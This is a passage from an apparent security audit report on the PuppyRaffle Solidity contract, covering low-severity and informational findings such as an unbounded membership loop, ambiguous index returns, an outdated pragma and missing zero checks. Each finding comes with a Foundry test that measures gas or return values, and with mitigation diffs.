+<p><strong>Description:</strong> <code>_isActivePlayer</code> scans the whole <code>players</code> array to answer a yes or no question. This is the same unbounded loop pattern as <code>H-1</code>, and it gets more expensive with every player that enters.</p>
+<p><strong>Impact:</strong> No impact while the function is unused, but it would be a gas problem the moment it is called.</p>
+<p><strong>Proof of Concept:</strong> Check the <code>test_LoopBasedMembershipCheck_AUDIT</code> test in the <code>PuppyRaffleTest.t.sol</code> file. It measures <code>getActivePlayerIndex</code>, since <code>_isActivePlayer</code> is internal and never called, and the two loops are identical:</p>
+<details open>
+<summary>
+Here’s the full code
+</summary>
+<div class="sourceCode" id="cb33"><div class="codehilite"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a>    <span class="kw">function</span> <span class="fu">test_LoopBasedMembershipCheck_AUDIT</span>() <span class="kw">public</span> {</span>
+<span id="cb33-2"><a href="#cb33-2" aria-hidden="true" tabindex="-1"></a>        <span class="co">// 10 players, and we look up the last one so the loop runs fully</span></span>
+<span id="cb33-3"><a href="#cb33-3" aria-hidden="true" tabindex="-1"></a>        address[] memory tenPlayers <span class="op">=</span> <span class="kw">new</span> address[](<span class="dv">10</span>)<span class="op">;</span></span>
+<span id="cb33-4"><a href="#cb33-4" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> (uint256 i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> <span class="dv">10</span><span class="op">;</span> i<span class="op">++</span>) {</span>
+<span id="cb33-5"><a href="#cb33-5" aria-hidden="true" tabindex="-1"></a>            tenPlayers[i] <span class="op">=</span> <span class="fu">address</span>(<span class="fu">uint160</span>(<span class="dv">1000</span> <span class="op">+</span> i))<span class="op">;</span></span>
+<span id="cb33-6"><a href="#cb33-6" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb33-7"><a href="#cb33-7" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="at">enterRaffle</span>{<span class="dt">value</span><span class="op">:</span> entranceFee <span class="op">*</span> <span class="dv">10</span>}(tenPlayers)<span class="op">;</span></span>
+<span id="cb33-8"><a href="#cb33-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb33-9"><a href="#cb33-9" aria-hidden="true" tabindex="-1"></a>        uint256 gasBefore <span class="op">=</span> <span class="fu">gasleft</span>()<span class="op">;</span></span>
+<span id="cb33-10"><a href="#cb33-10" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="fu">getActivePlayerIndex</span>(tenPlayers[<span class="dv">9</span>])<span class="op">;</span></span>
+<span id="cb33-11"><a href="#cb33-11" aria-hidden="true" tabindex="-1"></a>        uint256 gasWithTenPlayers <span class="op">=</span> gasBefore <span class="op">-</span> <span class="fu">gasleft</span>()<span class="op">;</span></span>
+<span id="cb33-12"><a href="#cb33-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb33-13"><a href="#cb33-13" aria-hidden="true" tabindex="-1"></a>        <span class="co">// 90 more players, 100 in total</span></span>
+<span id="cb33-14"><a href="#cb33-14" aria-hidden="true" tabindex="-1"></a>        address[] memory morePlayers <span class="op">=</span> <span class="kw">new</span> address[](<span class="dv">90</span>)<span class="op">;</span></span>
+<span id="cb33-15"><a href="#cb33-15" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> (uint256 i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> <span class="dv">90</span><span class="op">;</span> i<span class="op">++</span>) {</span>
+<span id="cb33-16"><a href="#cb33-16" aria-hidden="true" tabindex="-1"></a>            morePlayers[i] <span class="op">=</span> <span class="fu">address</span>(<span class="fu">uint160</span>(<span class="dv">2000</span> <span class="op">+</span> i))<span class="op">;</span></span>
+<span id="cb33-17"><a href="#cb33-17" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb33-18"><a href="#cb33-18" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="at">enterRaffle</span>{<span class="dt">value</span><span class="op">:</span> entranceFee <span class="op">*</span> <span class="dv">90</span>}(morePlayers)<span class="op">;</span></span>
+<span id="cb33-19"><a href="#cb33-19" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb33-20"><a href="#cb33-20" aria-hidden="true" tabindex="-1"></a>        gasBefore <span class="op">=</span> <span class="fu">gasleft</span>()<span class="op">;</span></span>
+<span id="cb33-21"><a href="#cb33-21" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="fu">getActivePlayerIndex</span>(morePlayers[<span class="dv">89</span>])<span class="op">;</span></span>
+<span id="cb33-22"><a href="#cb33-22" aria-hidden="true" tabindex="-1"></a>        uint256 gasWithHundredPlayers <span class="op">=</span> gasBefore <span class="op">-</span> <span class="fu">gasleft</span>()<span class="op">;</span></span>
+<span id="cb33-23"><a href="#cb33-23" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb33-24"><a href="#cb33-24" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;gas with 10 players:&quot;</span><span class="op">,</span> gasWithTenPlayers)<span class="op">;</span></span>
+<span id="cb33-25"><a href="#cb33-25" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;gas with 100 players:&quot;</span><span class="op">,</span> gasWithHundredPlayers)<span class="op">;</span></span>
+<span id="cb33-26"><a href="#cb33-26" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(</span>
+<span id="cb33-27"><a href="#cb33-27" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;Gas Difference:::::&quot;</span><span class="op">,</span></span>
+<span id="cb33-28"><a href="#cb33-28" aria-hidden="true" tabindex="-1"></a>            gasWithHundredPlayers <span class="op">-</span> gasWithTenPlayers</span>
+<span id="cb33-29"><a href="#cb33-29" aria-hidden="true" tabindex="-1"></a>        )<span class="op">;</span></span>
+<span id="cb33-30"><a href="#cb33-30" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb33-31"><a href="#cb33-31" aria-hidden="true" tabindex="-1"></a>        <span class="co">// the same lookup costs more as the array grows</span></span>
+<span id="cb33-32"><a href="#cb33-32" aria-hidden="true" tabindex="-1"></a>        <span class="fu">assert</span>(gasWithHundredPlayers <span class="op">&gt;</span> gasWithTenPlayers)<span class="op">;</span></span>
+<span id="cb33-33"><a href="#cb33-33" aria-hidden="true" tabindex="-1"></a>    }</span></code></pre></div></div>
+</details>
+<p>You can run it via</p>
+<div class="sourceCode" id="cb34"><div class="codehilite"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="ex">forge</span> test <span class="at">--mt</span> test_LoopBasedMembershipCheck_AUDIT <span class="at">-vvv</span></span></code></pre></div></div>
+<p>and you will see something like this:</p>
+<pre class="text"><code>Logs:
+  gas with 10 players: 28544
+  gas with 100 players: 255164
+  Gas Difference::::: 226620</code></pre>
+<p>The same lookup costs about 9x more gas with 100 players, since every call walks the whole array.</p>
+<p><strong>Recommended Mitigation:</strong> 1. If the function is kept, track membership with a mapping that is written on entry and cleared on refund, instead of looping:</p>
+<div class="sourceCode" id="cb36"><div class="codehilite"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="va">+    mapping(address =&gt; bool) public isActivePlayer;</span></span>
+<span id="cb36-2"><a href="#cb36-2" aria-hidden="true" tabindex="-1"></a>...</span>
+<span id="cb36-3"><a href="#cb36-3" aria-hidden="true" tabindex="-1"></a><span class="va">+        isActivePlayer[newPlayers[i]] = true;</span></span>
+<span id="cb36-4"><a href="#cb36-4" aria-hidden="true" tabindex="-1"></a>...</span>
+<span id="cb36-5"><a href="#cb36-5" aria-hidden="true" tabindex="-1"></a>     function _isActivePlayer() internal view returns (bool) {</span>
+<span id="cb36-6"><a href="#cb36-6" aria-hidden="true" tabindex="-1"></a><span class="st">-        for (uint256 i = 0; i &lt; players.length; i++) {</span></span>
+<span id="cb36-7"><a href="#cb36-7" aria-hidden="true" tabindex="-1"></a><span class="st">-            if (players[i] == msg.sender) {</span></span>
+<span id="cb36-8"><a href="#cb36-8" aria-hidden="true" tabindex="-1"></a><span class="st">-                return true;</span></span>
+<span id="cb36-9"><a href="#cb36-9" aria-hidden="true" tabindex="-1"></a><span class="st">-            }</span></span>
+<span id="cb36-10"><a href="#cb36-10" aria-hidden="true" tabindex="-1"></a><span class="st">-        }</span></span>
+<span id="cb36-11"><a href="#cb36-11" aria-hidden="true" tabindex="-1"></a><span class="st">-        return false;</span></span>
+<span id="cb36-12"><a href="#cb36-12" aria-hidden="true" tabindex="-1"></a><span class="va">+        return isActivePlayer[msg.sender];</span></span>
+<span id="cb36-13"><a href="#cb36-13" aria-hidden="true" tabindex="-1"></a>     }</span></code></pre></div></div>
+<ol start="2" type="1">
+<li>Otherwise remove the function, as recommended in <code>I-9</code>.</li>
+</ol>
+<hr />
+<h1 id="question">Question</h1>
+<h3 id="q-1-missing-check-for-an-empty-players-array-in-puppyraffleenterraffle-function-can-lead-to-a-0-eth-call-that-emits-raffleenter-and-wastes-gas">[Q-1] Missing check for an empty players array in <code>PuppyRaffle::enterRaffle</code> function, can lead to a 0 ETH call that emits <code>RaffleEnter</code> and wastes gas</h3>
+<p><strong>Description:</strong> <code>enterRaffle</code> only checks that the value sent matches the entrance fee, so an empty array means <code>0 == 0</code> and the call goes through without adding a single player:</p>
+<div class="sourceCode" id="cb37"><div class="codehilite"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="pp">require</span>(</span>
+<span id="cb37-2"><a href="#cb37-2" aria-hidden="true" tabindex="-1"></a>    msg<span class="op">.</span><span class="at">value</span> <span class="op">==</span> entranceFee <span class="op">*</span> newPlayers<span class="op">.</span><span class="at">length</span><span class="op">,</span></span>
+<span id="cb37-3"><a href="#cb37-3" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;PuppyRaffle: Must send enough to enter raffle&quot;</span></span>
+<span id="cb37-4"><a href="#cb37-4" aria-hidden="true" tabindex="-1"></a>)<span class="op">;</span></span></code></pre></div></div>
+<p>The contract still emits <code>RaffleEnter</code> with an empty array, paying gas for a call that does nothing. Is this intended, or should a call that adds no players be rejected?</p>
+<p><strong>Impact:</strong> A call that adds no players still emits <code>RaffleEnter</code> and wastes the caller’s gas.</p>
+<hr />
+<h1 id="informational">Informational</h1>
+<h3 id="i-1-puppyrafflegetactiveplayerindex-returns-0-for-inactive-players-making-not-found-look-exactly-like-the-player-at-index-0">[I-1] <code>PuppyRaffle::getActivePlayerIndex</code> returns 0 for inactive players, making “not found” look exactly like the player at index 0</h3>
+<p><strong>Description:</strong> The <code>getActivePlayerIndex</code> function loops over the <code>players</code> array and returns the index when it finds the player. But when the player is NOT in the raffle, it falls through the loop and returns <code>0</code>. Since <code>0</code> is also a completely valid index (the first player), a caller has no way to tell “this player sits at index 0” apart from “this player never entered the raffle”.</p>
+<p><strong>Impact:</strong> Inactive players get reported as index 0, so any contract or frontend trusting this return value can act on the wrong player.</p>
+<p><strong>Proof of Concept:</strong> Check the <code>test_GetActivePlayerIndex_AUDIT</code> test in the <code>PuppyRaffleTest.t.sol</code> file:</p>
+<details open>
+<summary>
+Here’s the full code
+</summary>
+<div class="sourceCode" id="cb38"><div class="codehilite"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a>    <span class="kw">function</span> <span class="fu">test_GetActivePlayerIndex_AUDIT</span>() <span class="kw">public</span> {</span>
+<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a>        address[] memory players <span class="op">=</span> <span class="kw">new</span> address[](<span class="dv">1</span>)<span class="op">;</span></span>
+<span id="cb38-3"><a href="#cb38-3" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">0</span>] <span class="op">=</span> playerOne<span class="op">;</span></span>
+<span id="cb38-4"><a href="#cb38-4" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="at">enterRaffle</span>{<span class="dt">value</span><span class="op">:</span> entranceFee}(players)<span class="op">;</span></span>
+<span id="cb38-5"><a href="#cb38-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb38-6"><a href="#cb38-6" aria-hidden="true" tabindex="-1"></a>        address notAPlayer <span class="op">=</span> <span class="fu">makeAddr</span>(<span class="st">&quot;notAPlayer&quot;</span>)<span class="op">;</span></span>
+<span id="cb38-7"><a href="#cb38-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb38-8"><a href="#cb38-8" aria-hidden="true" tabindex="-1"></a>        uint256 indexOfRealPlayer <span class="op">=</span> puppyRaffle<span class="op">.</span><span class="fu">getActivePlayerIndex</span>(playerOne)<span class="op">;</span></span>
+<span id="cb38-9"><a href="#cb38-9" aria-hidden="true" tabindex="-1"></a>        uint256 indexOfInactivePlayer <span class="op">=</span> puppyRaffle<span class="op">.</span><span class="fu">getActivePlayerIndex</span>(</span>
+<span id="cb38-10"><a href="#cb38-10" aria-hidden="true" tabindex="-1"></a>            notAPlayer</span>
+<span id="cb38-11"><a href="#cb38-11" aria-hidden="true" tabindex="-1"></a>        )<span class="op">;</span></span>
+<span id="cb38-12"><a href="#cb38-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb38-13"><a href="#cb38-13" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;Index of playerOne:&quot;</span><span class="op">,</span> indexOfRealPlayer)<span class="op">;</span></span>
+<span id="cb38-14"><a href="#cb38-14" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;Index of inactive player:&quot;</span><span class="op">,</span> indexOfInactivePlayer)<span class="op">;</span></span>
+<span id="cb38-15"><a href="#cb38-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb38-16"><a href="#cb38-16" aria-hidden="true" tabindex="-1"></a>        <span class="co">// both return 0, so they are indistinguishable</span></span>
+<span id="cb38-17"><a href="#cb38-17" aria-hidden="true" tabindex="-1"></a>        <span class="fu">assertEq</span>(indexOfRealPlayer<span class="op">,</span> indexOfInactivePlayer)<span class="op">;</span></span>
+<span id="cb38-18"><a href="#cb38-18" aria-hidden="true" tabindex="-1"></a>        <span class="fu">assertEq</span>(puppyRaffle<span class="op">.</span><span class="fu">players</span>(<span class="dv">0</span>)<span class="op">,</span> playerOne)<span class="op">;</span></span>
+<span id="cb38-19"><a href="#cb38-19" aria-hidden="true" tabindex="-1"></a>    }</span></code></pre></div></div>
+</details>
+<p>You can run it via</p>
+<div class="sourceCode" id="cb39"><div class="codehilite"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="ex">forge</span> test <span class="at">--mt</span> test_GetActivePlayerIndex_AUDIT <span class="at">-vvv</span></span></code></pre></div></div>
+<p>and you will see something like this:</p>
+<pre class="text"><code>Logs:
+  Index of playerOne: 0
+  Index of inactive player: 0</code></pre>
+<p>The player who entered and the player who never entered both come back as <code>0</code>.</p>
+<p><strong>Recommended Mitigation:</strong> 1. Revert when the player cannot be found, so the failure is explicit instead of silently looking like index 0:</p>
+<div class="sourceCode" id="cb41"><div class="codehilite"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a>     function getActivePlayerIndex(</span>
+<span id="cb41-2"><a href="#cb41-2" aria-hidden="true" tabindex="-1"></a>         address player</span>
+<span id="cb41-3"><a href="#cb41-3" aria-hidden="true" tabindex="-1"></a>     ) external view returns (uint256) {</span>
+<span id="cb41-4"><a href="#cb41-4" aria-hidden="true" tabindex="-1"></a>         for (uint256 i = 0; i &lt; players.length; i++) {</span>
+<span id="cb41-5"><a href="#cb41-5" aria-hidden="true" tabindex="-1"></a>             if (players[i] == player) {</span>
+<span id="cb41-6"><a href="#cb41-6" aria-hidden="true" tabindex="-1"></a>                 return i;</span>
+<span id="cb41-7"><a href="#cb41-7" aria-hidden="true" tabindex="-1"></a>             }</span>
+<span id="cb41-8"><a href="#cb41-8" aria-hidden="true" tabindex="-1"></a>         }</span>
+<span id="cb41-9"><a href="#cb41-9" aria-hidden="true" tabindex="-1"></a><span class="st">-        return 0;</span></span>
+<span id="cb41-10"><a href="#cb41-10" aria-hidden="true" tabindex="-1"></a><span class="va">+        revert(&quot;PuppyRaffle: Player is not active&quot;);</span></span>
+<span id="cb41-11"><a href="#cb41-11" aria-hidden="true" tabindex="-1"></a>     }</span></code></pre></div></div>
+<ol start="2" type="1">
+<li>Or return a sentinel value that can never be a valid array index, and let the caller handle it:</li>
+</ol>
+<div class="sourceCode" id="cb42"><div class="codehilite"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb42-1"><a href="#cb42-1" aria-hidden="true" tabindex="-1"></a><span class="st">-        return 0;</span></span>
+<span id="cb42-2"><a href="#cb42-2" aria-hidden="true" tabindex="-1"></a><span class="va">+        // type(uint256).max is never a valid index</span></span>
+<span id="cb42-3"><a href="#cb42-3" aria-hidden="true" tabindex="-1"></a><span class="va">+        return type(uint256).max;</span></span></code></pre></div></div>
+<hr />
+<h3 id="i-2-floating-and-outdated-pragma-in-puppyraffle-contract-the-old-compiler-version-misses-built-in-overflow-checks-and-other-fixes">[I-2] Floating and outdated pragma in <code>PuppyRaffle</code> contract, the old compiler version misses built-in overflow checks and other fixes</h3>
+<p><strong>Description:</strong> The contract starts with <code>pragma solidity ^0.7.6</code>, which is both floating and several years old. A floating pragma lets the contract be compiled with any <code>0.7.x</code> version, and <code>0.7.6</code> has no built-in overflow checks, which is the root of <code>M-1</code>.</p>
+<p><strong>Impact:</strong> No impact on its own, but the old version is what makes the overflow in <code>M-1</code> possible in the first place.</p>
+<p><strong>Recommended Mitigation:</strong> 1. Pin the pragma to the exact version the code was tested with, instead of allowing a range:</p>
+<div class="sourceCode" id="cb43"><div class="codehilite"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb43-1"><a href="#cb43-1" aria-hidden="true" tabindex="-1"></a><span class="st">- pragma solidity ^0.7.6;</span></span>
+<span id="cb43-2"><a href="#cb43-2" aria-hidden="true" tabindex="-1"></a><span class="va">+ pragma solidity 0.7.6;</span></span></code></pre></div></div>
+<ol start="2" type="1">
+<li>Better, upgrade to <code>0.8.x</code>, where <code>+</code>, <code>-</code> and <code>*</code> revert on overflow automatically:</li>
+</ol>
+<div class="sourceCode" id="cb44"><div class="codehilite"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb44-1"><a href="#cb44-1" aria-hidden="true" tabindex="-1"></a><span class="st">- pragma solidity ^0.7.6;</span></span>
+<span id="cb44-2"><a href="#cb44-2" aria-hidden="true" tabindex="-1"></a><span class="va">+ pragma solidity 0.8.20;</span></span></code></pre></div></div>
+<hr />
+<h3 id="i-3-non-constant-image-uri-variables-in-puppyraffle-contract-they-never-change-and-only-cost-gas-at-deployment">[I-3] Non-constant image URI variables in <code>PuppyRaffle</code> contract, they never change and only cost gas at deployment</h3>
+<p><strong>Description:</strong> <code>commonImageUri</code>, <code>rareImageUri</code> and <code>legendaryImageUri</code> are regular storage variables holding <code>ipfs://</code> strings, and they are only read once in the constructor to fill up <code>rarityToUri</code>. Marking them <code>constant</code> removes those storage writes and reads completely.</p>
+<p><strong>Impact:</strong> No security impact, just wasted gas at deployment and a false signal that these values are meant to change.</p>
+<p><strong>Recommended Mitigation:</strong></p>
+<div class="sourceCode" id="cb45"><div class="codehilite"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb45-1"><a href="#cb45-1" aria-hidden="true" tabindex="-1"></a><span class="st">-    string private commonImageUri =</span></span>
+<span id="cb45-2"><a href="#cb45-2" aria-hidden="true" tabindex="-1"></a><span class="va">+    string private constant commonImageUri =</span></span>
+<span id="cb45-3"><a href="#cb45-3" aria-hidden="true" tabindex="-1"></a>         &quot;ipfs://QmSsYRx3LpDAb1GZQm7zZ1AuHZjfbPkD6J7s9r41xu1mf8&quot;;</span></code></pre></div></div>
+<p>The same applies to <code>rareImageUri</code> and <code>legendaryImageUri</code>.</p>
+<hr />
+<h3 id="i-4-missing-zero-value-checks-on-the-constructor-parameters-in-puppyraffle-constructor-a-misconfigured-deployment-can-be-impossible-to-fix">[I-4] Missing zero value checks on the constructor parameters in <code>PuppyRaffle</code> constructor, a misconfigured deployment can be impossible to fix</h3>
+<p><strong>Description:</strong> <code>entranceFee</code>, <code>feeAddress</code> and <code>raffleDuration</code> are assigned in the constructor without any validation. Because <code>entranceFee</code> is <code>immutable</code>, a fee of <code>0</code> would make every entry free for the lifetime of the contract.</p>
+<p><strong>Impact:</strong> A zero entrance fee can never be corrected, and a zero <code>feeAddress</code> sends the fees to <code>address(0)</code> until the owner notices.</p>
+<p><strong>Recommended Mitigation:</strong></p>
+<div class="sourceCode" id="cb46"><div class="codehilite"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb46-1"><a href="#cb46-1" aria-hidden="true" tabindex="-1"></a>      ) ERC721(&quot;Puppy Raffle&quot;, &quot;PR&quot;) {</span>
+<span id="cb46-2"><a href="#cb46-2" aria-hidden="true" tabindex="-1"></a><span class="va">+        require(_entranceFee &gt; 0, &quot;PuppyRaffle: Entrance fee cannot be zero&quot;);</span></span>
+<span id="cb46-3"><a href="#cb46-3" aria-hidden="true" tabindex="-1"></a><span class="va">+        require(_feeAddress != address(0), &quot;PuppyRaffle: Fee address cannot be zero&quot;);</span></span>
+<span id="cb46-4"><a href="#cb46-4" aria-hidden="true" tabindex="-1"></a><span class="va">+        require(_raffleDuration &gt; 0, &quot;PuppyRaffle: Duration cannot be zero&quot;);</span></span>
+<span id="cb46-5"><a href="#cb46-5" aria-hidden="true" tabindex="-1"></a>         entranceFee = _entranceFee;</span></code></pre></div></div>
+<hr />
+<h3 id="i-5-no-early-return-for-an-empty-players-array-in-puppyraffleenterraffle-function-a-call-that-adds-nobody-still-loops-and-emits-raffleenter">[I-5] No early return for an empty players array in <code>PuppyRaffle::enterRaffle</code> function, a call that adds nobody still loops and emits <code>RaffleEnter</code></h3>
+<p><strong>Description:</strong> When <code>newPlayers</code> is empty, <code>msg.value == entranceFee * newPlayers.length</code> becomes <code>0 == 0</code>, so the call goes through without adding a player. The duplicate loop still runs over the existing players and the event is emitted with an empty array, all for a call that does nothing.</p>
+<p><strong>Impact:</strong> No security impact, the caller only wastes their own gas.</p>
+<p><strong>Recommended Mitigation:</strong> 1. Same fix as <code>Q-1</code>, reject calls that add no players so the loop and the event are skipped.</p>
+<hr />
+<h3 id="i-6-storage-array-length-is-read-on-every-iteration-in-puppyrafflegetactiveplayerindex-function-caching-it-in-memory-saves-gas">[I-6] Storage array length is read on every iteration in <code>PuppyRaffle::getActivePlayerIndex</code> function, caching it in memory saves gas</h3>
+<p><strong>Description:</strong> The loop condition evaluates <code>players.length</code> on each iteration, which is a storage read every time. Copying the length into a local variable once removes all the repeated <code>SLOAD</code>s.</p>
+<p><strong>Impact:</strong> No security impact, only gas. It is a <code>view</code> function so callers pay nothing, but the same pattern sits in the hot path of <code>enterRaffle</code> and <code>selectWinner</code>.</p>
+<p><strong>Recommended Mitigation:</strong></p>
+<div class="sourceCode" id="cb47"><div class="codehilite"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb47-1"><a href="#cb47-1" aria-hidden="true" tabindex="-1"></a><span class="va">+        uint256 playersLength = players.length;</span></span>
+<span id="cb47-2"><a href="#cb47-2" aria-hidden="true" tabindex="-1"></a><span class="st">-        for (uint256 i = 0; i &lt; players.length; i++) {</span></span>
+<span id="cb47-3"><a href="#cb47-3" aria-hidden="true" tabindex="-1"></a><span class="va">+        for (uint256 i = 0; i &lt; playersLength; i++) {</span></span></code></pre></div></div>
+<hr />
+<h3 id="i-7-magic-numbers-for-the-prize-and-fee-split-in-puppyraffleselectwinner-function-the-8020-values-should-be-named-constants">[I-7] Magic numbers for the prize and fee split in <code>PuppyRaffle::selectWinner</code> function, the 80/20 values should be named constants</h3>
+<p><strong>Description:</strong> <code>prizePool</code> and <code>fee</code> are calculated with the hardcoded values <code>80</code>, <code>20</code> and <code>100</code>. Naming them makes the intended split explicit, and the two percentages must always add up to the denominator, which is easy to break silently.</p>
+<p><strong>Impact:</strong> No security impact, only readability and a higher chance of a typo going unnoticed in review.</p>
+<p><strong>Recommended Mitigation:</strong></p>
+<div class="sourceCode" id="cb48"><div class="codehilite"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb48-1"><a href="#cb48-1" aria-hidden="true" tabindex="-1"></a><span class="va">+    uint256 public constant PRIZE_PERCENTAGE = 80;</span></span>
+<span id="cb48-2"><a href="#cb48-2" aria-hidden="true" tabindex="-1"></a><span class="va">+    uint256 public constant FEE_PERCENTAGE = 20;</span></span>
+<span id="cb48-3"><a href="#cb48-3" aria-hidden="true" tabindex="-1"></a><span class="va">+    uint256 public constant PERCENTAGE_DENOMINATOR = 100;</span></span>
+<span id="cb48-4"><a href="#cb48-4" aria-hidden="true" tabindex="-1"></a>...</span>
+<span id="cb48-5"><a href="#cb48-5" aria-hidden="true" tabindex="-1"></a><span class="st">-        uint256 prizePool = (totalAmountCollected * 80) / 100;</span></span>
+<span id="cb48-6"><a href="#cb48-6" aria-hidden="true" tabindex="-1"></a><span class="st">-        uint256 fee = (totalAmountCollected * 20) / 100;</span></span>
+<span id="cb48-7"><a href="#cb48-7" aria-hidden="true" tabindex="-1"></a><span class="va">+        uint256 prizePool = (totalAmountCollected * PRIZE_PERCENTAGE) / PERCENTAGE_DENOMINATOR;</span></span>
+<span id="cb48-8"><a href="#cb48-8" aria-hidden="true" tabindex="-1"></a><span class="va">+        uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / PERCENTAGE_DENOMINATOR;</span></span></code></pre></div></div>
+<hr />
+<h3 id="i-8-missing-zero-address-check-in-puppyrafflechangefeeaddress-function-the-owner-can-accidentally-send-the-fees-to-address0">[I-8] Missing zero address check in <code>PuppyRaffle::changeFeeAddress</code> function, the owner can accidentally send the fees to <code>address(0)</code></h3>
+<p><strong>Description:</strong> <code>changeFeeAddress</code> accepts any address, including <code>address(0)</code>. Since <code>withdrawFees</code> sends the whole fee balance to <code>feeAddress</code>, a zero address burns those funds for good.</p>
+<p><strong>Impact:</strong> All future fees can be lost through a single owner mistake.</p>
+<p><strong>Recommended Mitigation:</strong></p>
+<div class="sourceCode" id="cb49"><div class="codehilite"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb49-1"><a href="#cb49-1" aria-hidden="true" tabindex="-1"></a>      function changeFeeAddress(address newFeeAddress) external onlyOwner {</span>
+<span id="cb49-2"><a href="#cb49-2" aria-hidden="true" tabindex="-1"></a><span class="va">+        require(newFeeAddress != address(0), &quot;PuppyRaffle: Fee address cannot be zero&quot;);</span></span>
+<span id="cb49-3"><a href="#cb49-3" aria-hidden="true" tabindex="-1"></a>         feeAddress = newFeeAddress;</span></code></pre></div></div>
+<hr />
+<h3 id="i-9-unused-_isactiveplayer-function-in-puppyraffle-contract-dead-code-that-only-adds-review-surface">[I-9] Unused <code>_isActivePlayer</code> function in <code>PuppyRaffle</code> contract, dead code that only adds review surface</h3>
+<p><strong>Description:</strong> <code>_isActivePlayer</code> is declared <code>internal</code> but is never called anywhere in the contract. Dead code still has to be reviewed and maintained, and it hides the fact that the membership check was never wired into <code>refund</code> or <code>selectWinner</code>.</p>
+<p><strong>Impact:</strong> No direct security impact, but it is unnecessary code that misleads future readers into thinking membership is enforced.</p>
+<p><strong>Recommended Mitigation:</strong> 1. Remove the function, since nothing calls it. 2. If it is meant to be used, wire it into the functions that need a membership check, and see <code>L-1</code> for the right way to implement it.</p>
+<h1 id="gas">Gas</h1>
+<p>No gas findings.</p>
+
+</body>
+</html>
